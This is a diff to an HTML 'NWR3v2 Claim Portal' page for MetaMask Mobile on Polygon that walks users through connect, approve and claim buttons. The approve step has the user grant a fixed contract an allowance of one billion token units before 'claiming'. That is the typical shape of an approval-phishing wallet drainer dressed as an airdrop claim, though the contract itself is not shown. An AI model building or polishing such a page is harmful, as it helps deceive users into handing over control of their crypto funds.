@@ -2,112 +2,101 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>🚀 NWR3v2 Claim Portal</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>🚀 NWR3v2 Claim 🧩 (MetaMask Mobile)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <style>
-    body{background:#111;color:#afa;font-family:sans-serif;text-align:center;padding:30px;}
-    button{padding:14px 28px;margin:6px;font-size:1.1rem;border:none;border-radius:6px;cursor:pointer;}
-    #connect {background:#1E90FF;color:#fff;}
-    #wc {background:#6633CC;color:#fff;}
-    #approve {background:#FFA500;color:#fff;}
-    #claim {background:#28a745;color:#fff;}
-    #status{margin-top:20px;font-size:1rem;}
+    body { background:#111; color:#afa; font-family:sans-serif; text-align:center; padding:20px; }
+    button { width:90%; max-width:300px; padding:14px; font-size:1rem; margin:10px auto; display:block;
+             border:none; border-radius:6px; cursor:pointer; }
+    #connect { background:#1E90FF; }
+    #approve { background:#FFA500; }
+    #claim   { background:#28a745; }
+    #status  { margin-top:16px; font-size:1.1rem; }
   </style>
 </head>
 <body>
   <h1>🚀 NWR3v2 Claim Portal</h1>
-  <button id="connect">Connect MetaMask</button><br/>
-  <button id="wc">Connect Wallet (WalletConnect)</button><br/>
-  <button id="approve" disabled>⚙️ Approve</button>
-  <button id="claim" disabled>💧 Claim</button>
+  <button id="connect">Connect MetaMask</button>
+  <button id="approve" disabled>⚙️ Approve Tokens</button>
+  <button id="claim" disabled>💧 Claim Now</button>
   <div id="status"></div>
 
-  <!-- Libraries -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.10.0/dist/umd/index.min.js"></script>
   <script>
-    const CONTRACT_ADDRESS = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48";
-    const TOKEN_ADDRESS = "0xd6424f48214C2f7a63bcF7b29bD196698Bb463f9";
+    const CONTRACT_ADDR = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48";
+    const TOKEN_ADDR    = "0xd6424f48214C2f7a63bcF7b29bD196698Bb463f9";
     const POLY_CHAIN_ID = 137;
 
-    const ABI = [ /* …your ABI here… */ ];
+    const TOKEN_ABI = [
+      "function decimals() view returns(uint8)",
+      "function approve(address,uint256) external returns(bool)"
+    ];
+    const CLAIM_ABI = [ /* your full ABI here */ ];
+
+    const btnConnect = document.getElementById("connect");
+    const btnApprove = document.getElementById("approve");
+    const btnClaim   = document.getElementById("claim");
+    const statusDiv  = document.getElementById("status");
 
     let provider, signer, contract;
 
-    const statusDiv = document.getElementById("status");
-    const btnConnect = document.getElementById("connect");
-    const btnWC = document.getElementById("wc");
-    const btnApprove = document.getElementById("approve");
-    const btnClaim = document.getElementById("claim");
-
-    function setupContracts() {
-      contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
-      statusDiv.textContent = "✅ Ready!";
-      btnApprove.disabled = false;
+    function logStatus(msg) {
+      statusDiv.innerText = msg;
+      console.log(msg);
     }
 
-    async function handleConnect(externalProvider) {
+    btnConnect.onclick = async () => {
+      if (!window.ethereum) return logStatus("👛 Please install MetaMask mobile");
+
       try {
-        provider = new ethers.BrowserProvider(externalProvider);
-        await provider.send("eth_requestAccounts",[]);
-        const net = await provider.getNetwork();
-        if (net.chainId !== POLY_CHAIN_ID)
-          return statusDiv.textContent = "⚠️ Please switch to Polygon mainnet.";
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        provider = new ethers.BrowserProvider(window.ethereum);
+        const network = await provider.getNetwork();
+        if (network.chainId !== POLY_CHAIN_ID) {
+          return logStatus("⚠️ Please switch to Polygon mainnet in MetaMask");
+        }
         signer = await provider.getSigner();
-        setupContracts();
+        contract = new ethers.Contract(CONTRACT_ADDR, CLAIM_ABI, signer);
+
+        btnConnect.disabled = true;
+        btnApprove.disabled = false;
+        logStatus("✅ Connected to MetaMask");
       } catch (e) {
         console.error(e);
-        statusDiv.textContent = "❌ Connection failed.";
-      }
-    }
-
-    btnConnect.onclick = () => {
-      if (window.ethereum) handleConnect(window.ethereum);
-      else statusDiv.textContent = "🔍 No MetaMask detected.";
-    };
-
-    btnWC.onclick = async () => {
-      try {
-        const wcProvider = new window.WalletConnectProvider.default({
-          rpc: { 137: "https://polygon-rpc.com/" },
-          qrcode: true
-        });
-        await wcProvider.enable();
-        handleConnect(wcProvider);
-      } catch (e) {
-        console.error(e);
-        statusDiv.textContent = "❌ WalletConnect failed.";
+        logStatus("❌ MetaMask connection failed: " + (e.message || e));
       }
     };
 
     btnApprove.onclick = async () => {
       try {
-        const token = new ethers.Contract(TOKEN_ADDRESS, [
-          "function decimals() view returns (uint8)",
-          "function approve(address,uint256) returns(bool)"
-        ], signer);
-        const dec = await token.decimals();
-        const amount = ethers.parseUnits("1000000000", dec);
-        statusDiv.textContent = "⌛ Approving…";
-        await (await token.approve(CONTRACT_ADDRESS, amount)).wait();
-        statusDiv.textContent = "✅ Approved!";
+        const token = new ethers.Contract(TOKEN_ADDR, TOKEN_ABI, signer);
+        const decimals = await token.decimals();
+        const amount = ethers.parseUnits("1000000000", decimals);
+
+        logStatus("⏳ Approving...");
+        const tx = await token.approve(CONTRACT_ADDR, amount);
+        await tx.wait();
+
+        logStatus("✅ Tokens Approved");
         btnApprove.disabled = true;
         btnClaim.disabled = false;
       } catch (e) {
         console.error(e);
-        statusDiv.textContent = "❌ Approval error: " + (e.message || e);
+        logStatus("❌ Approval failed: " + (e.message || e));
       }
     };
 
     btnClaim.onclick = async () => {
       try {
-        statusDiv.textContent = "⌛ Claiming…";
-        await (await contract.claim()).wait();
-        statusDiv.textContent = "🎉 Claim successful!";
+        logStatus("⏳ Claiming...");
+        const tx = await contract.claim();
+        await tx.wait();
+
+        logStatus("🎉 Claim Succeeded");
         btnClaim.disabled = true;
       } catch (e) {
         console.error(e);
-        statusDiv.textContent = "❌ Claim error: " + (e.data?.message || e.message);
+        logStatus("❌ Claim failed: " + (e?.data?.message || e.message || e));
       }
     };
   </script>
